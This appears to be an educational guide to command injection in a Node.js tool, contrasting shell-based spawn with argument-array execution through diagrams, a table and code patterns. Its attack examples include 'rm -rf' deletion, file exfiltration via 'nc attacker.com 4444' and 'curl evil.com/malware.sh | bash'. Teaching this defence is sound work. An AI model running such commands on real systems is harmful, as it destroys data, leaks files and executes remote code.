# Visual Guide: Command Injection Attack Flow

## 🔴 VULNERABLE VERSION ATTACK FLOW

```
┌─────────────────────────────────────────────────────┐
│  User Input (Attacker)                              │
│  -c "cat {} ; rm -rf /important"                    │
└─────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────┐
│  Replace {} with filename                           │
│  "cat file.txt ; rm -rf /important"                 │
└─────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────┐
│  spawn(command, { shell: true })                    │
│  ⚠️  Passes entire string to shell                  │
└─────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────┐
│  Shell interprets command                           │
│  /bin/sh -c "cat file.txt ; rm -rf /important"      │
└─────────────────────────────────────────────────────┘
                    ↓
          ┌─────────┴─────────┐
          ↓                   ↓
┌──────────────────┐  ┌──────────────────┐
│  cat file.txt    │  │ rm -rf /important│
│  ✓ Executes      │  │ ✓ Executes       │
│  Shows content   │  │ ❌ DELETES FILES │
└──────────────────┘  └──────────────────┘

Result: 🔥 SYSTEM COMPROMISED 🔥
```

## 🟢 FIXED VERSION DEFENSE

```
┌─────────────────────────────────────────────────────┐
│  User Input (Attacker)                              │
│  -c "cat {} ; rm -rf /important"                    │
└─────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────┐
│  Split into parts                                   │
│  ["cat", "{}", ";", "rm", "-rf", "/important"]      │
└─────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────┐
│  Replace {} in each part                            │
│  ["cat", "file.txt", ";", "rm", "-rf", "/important"]│
└─────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────┐
│  spawn(executable, args)  // No shell!              │
│  executable: "cat"                                  │
│  args: ["file.txt", ";", "rm", "-rf", "/important"] │
└─────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────┐
│  Direct execution (no shell interpretation)         │
│  Tries to run: cat file.txt ";" "rm" "-rf" ...      │
└─────────────────────────────────────────────────────┘
                    ↓
┌─────────────────────────────────────────────────────┐
│  cat: cannot open ';': No such file or directory    │
│  ⛔ Command fails - special chars are literals      │
└─────────────────────────────────────────────────────┘

Result: ✅ ATTACK BLOCKED ✅
```

## 📊 Side-by-Side Comparison

| Step | Vulnerable | Fixed |
|------|-----------|-------|
| **Input** | `"cat {} ; rm -rf /"` | `"cat {} ; rm -rf /"` |
| **Processing** | String replacement | Parse into array |
| **Execution** | Shell interprets | Direct execution |
| **Special chars** | Executed as commands | Treated as literals |
| **Result** | Both commands run ❌ | Only cat runs, fails on `;` ✅ |

## 🎯 Attack Examples

### Example 1: File Deletion
```bash
# Attack command:
-c "cat {} ; rm -rf /tmp/important"

# Vulnerable: Deletes /tmp/important ❌
# Fixed: Fails with "No such file: ';'" ✅
```

### Example 2: Data Exfiltration
```bash
# Attack command:
-c "cat {} | nc attacker.com 4444"

# Vulnerable: Sends file to attacker ❌
# Fixed: Fails with "No such file: '|'" ✅
```

### Example 3: Remote Code Execution
```bash
# Attack command:
-c "cat {} && curl evil.com/malware.sh | bash"

# Vulnerable: Downloads and runs malware ❌
# Fixed: Fails with "No such file: '&&'" ✅
```

### Example 4: Privilege Escalation
```bash
# Attack command:
-c "cat {} ; sudo su -"

# Vulnerable: May escalate privileges ❌
# Fixed: Fails with "No such file: ';'" ✅
```

## 🔍 Detection in Code

### Red Flags (Vulnerable Patterns)
```javascript
❌ spawn(userInput, { shell: true })
❌ exec(userInput)
❌ execSync(userInput)
❌ spawn('sh', ['-c', userInput])
```

### Safe Patterns
```javascript
✅ spawn(cmd, [arg1, arg2])  // No shell
✅ execFile(cmd, [arg1, arg2])
✅ spawn with allowlist validation
```

## 📈 Impact Analysis

### Vulnerable Version
- **Severity**: Critical (CVSS 9.8)
- **Exploitability**: Easy (single command)
- **Impact**: Complete system compromise
- **Affected**: Any user input in `-c` flag

### Fixed Version
- **Severity**: None
- **Exploitability**: N/A (blocked)
- **Impact**: None
- **Protection**: Complete

## 🛡️ Defense in Depth

The fix is just the first layer. Additional protections:

1. **Input Validation** - Allowlist commands
2. **Least Privilege** - Run with minimal permissions
3. **Sandboxing** - Use containers/VMs
4. **Monitoring** - Log all executions
5. **Regular Audits** - Review code for vulnerabilities

## 💡 Key Lesson

**Never trust user input + shell = disaster**

Always use direct execution without shell interpretation when dealing with user-controlled data.

---

**Remember**: Shell features (pipes, redirects, command chaining) are powerful for users but dangerous when attacker-controlled.
